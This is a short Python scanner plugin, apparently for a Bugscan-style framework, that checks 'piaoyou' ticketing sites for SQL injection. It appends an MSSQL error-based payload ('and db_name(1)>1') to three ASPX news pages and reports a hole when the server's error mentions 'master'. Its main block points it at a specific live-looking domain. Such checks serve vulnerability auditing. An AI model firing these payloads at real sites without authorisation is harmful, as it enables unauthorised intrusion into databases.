#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-0101565
#refer:http://www.wooyun.org/bugs/wooyun-2010-0101570
#refer:http://www.wooyun.org/bugs/wooyun-2010-0101572

import re

def assign(service, arg):
    if service == "piaoyou":
        return True, arg
        
        
def audit(arg): 
    payload1 = [
    'newslist.aspx?a=1',
    '/news_view.aspx?a=4',
    '/news_view.aspx?id=4'
    ]
    for payload in payload1:
        url = arg + payload + '%20and%20db_name%281%29%3E1'
        code, head, res, errcode, _ = curl.curl2(url)
        if code == 500 and 'master' in res :
            security_hole(arg + payload + '  :found sql Injection')

if __name__ == '__main__':
    from dummy import *
    audit(assign('piaoyou', 'http://www.iyoungsh.com/')[1])